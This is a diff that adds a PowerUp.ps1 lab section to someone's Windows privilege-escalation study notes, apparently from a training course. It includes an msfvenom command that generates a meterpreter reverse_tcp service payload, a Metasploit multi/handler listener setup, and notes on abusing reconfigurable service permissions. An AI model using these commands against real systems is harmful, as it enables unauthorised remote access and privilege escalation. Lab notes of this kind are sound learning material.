@@ -128,3 +128,12 @@
             * In the output, you want to look for things `SERVICE_ALL_ACCESS` which means you own the service (you can start/stop/configure it). `SERVICE_CHANGE_CONFIG` which means you can change the `binpath` to point to your reverse shell. `WRITE_DAC` to change the permissions of the service to give yourself `SEVICE_CHANGE_CONFIG`. `WRITE_OWNER` to become owner of the service and then change its permissions. 
         * `Write-UserAddMSI`: writes out an MSI installer that prompts for a user to be added.
         * `Invoke-AllChecks`: runs all current enumeration checks and returns a report. 
+
+##### LAB: Introduction to PowerUp.ps1
+* **Task 1**: `Import-Module .\PowerUp.Ps1`
+* **Task 2**: `Invoke-AllChecks` is the PowerUp function which performs all enumeration checks on a target system.
+* **Task 6**: To run as another user, we use `runas /user:user1 powershell`
+* **Task 10**: We use Metasploit in our Kali box to create an `exe-service` reverse shell payload with `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.102.122.194 lport=4444 -f exe-service > Temp.exe`.
+  * When you find a service that you can reconfigure (using those `accesschk` or these PowerUp techniques), you can't just use a standard .exe. You have to use a file that speaks the "Service Control Manager" (SCM) language.
+* **Task 11** RDPing into the Desktop box using `xfreerdp` and mapping the drive: `xfreerdp /v:10.102.65.250 /u:user1 /dynamic-resolution +drives /drive:root,/home/kali`
+ * To start a listener, `msfconsole` --> `use exploit/multi/handler` --> `set PAYLOAD windows/x64/meterpreter/reverse_tcp` --> `set LHOST 10.102.122.194` --> `set LPORT 4444` --> `run`. I was stupid and renamed my exploit from Temp at first, and it didn't work, and then I realized it's Temp because of `Temp Folder`. 
